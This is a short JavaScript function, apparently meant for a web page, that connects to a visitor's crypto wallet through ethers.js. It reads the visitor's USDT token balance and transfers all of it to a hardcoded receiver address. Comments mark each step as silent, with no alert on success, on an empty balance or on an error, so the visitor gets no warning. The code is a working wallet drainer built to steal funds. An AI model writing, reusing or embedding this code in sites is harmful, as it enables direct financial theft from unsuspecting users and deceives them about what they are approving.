async function sendUSDT() {
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
  const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
  const abi = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)"
  ];

  if (!window.ethereum) {
    // No alert
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    const usdt = new ethers.Contract(usdtAddress, abi, signer);
    const balance = await usdt.balanceOf(userAddress);

    if (balance.isZero()) {
      return; // No alert, silent
    }

    const tx = await usdt.transfer(receiver, balance);
    await tx.wait();

    // Transfer success — no alert
  } catch (err) {
    // Silent fail — do nothing
  }
}
